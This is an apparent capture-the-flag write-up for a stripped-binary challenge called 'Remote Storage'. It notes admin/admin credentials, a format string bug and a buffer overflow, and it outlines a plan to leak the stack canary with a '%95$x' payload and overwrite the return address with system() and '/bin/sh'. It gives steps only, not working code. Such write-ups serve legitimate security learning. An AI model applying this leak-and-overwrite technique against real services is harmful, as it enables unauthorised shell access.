# Remote Storage
* This is my first exploit of stripped binary
* I didn't solve this on time

---
## Binary Analysis
* login user and password is both "admin"
* using "system()" but we cant use "/", "\\" and "."
* fsb in function "sign file"
* bof in fuction "add info"

## Exploit Summery
1. login with (admin/admin)
2. leak canary(%95$x) & ret addr(%94 - 0x1cc)
3. overwrite ret addr to system(@ 0x8052cf0) + /bin/sh(@ 0x80C7B8C) using bof
